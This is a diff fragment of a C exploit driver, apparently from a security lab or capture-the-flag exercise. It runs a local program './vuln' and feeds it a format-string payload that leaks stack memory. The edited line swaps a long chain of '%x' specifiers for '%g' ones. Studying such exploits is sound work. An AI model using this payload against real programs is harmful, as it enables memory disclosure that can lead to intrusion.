@@ -120,7 +120,7 @@ int main(int argc, char* argv[]) {
    create_subproc("./vuln", nargv);
 
    // print something from the stack
-   put_str("e \"AAAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x\"");
+   put_str("e \"AAAAAAAAAAAAAAAAA %g %g %g %g %g %g %g %g %g %g %g %g %g %g %g %g %g %g %g %g  %g %g %g %g %g %g %g %g %g %g  %g %g %g %g %g %g %g %g %g %g %g %g %g %g %x %x %x %x\"");
    send();
 
    // extract something (e.g., the second element) from output 
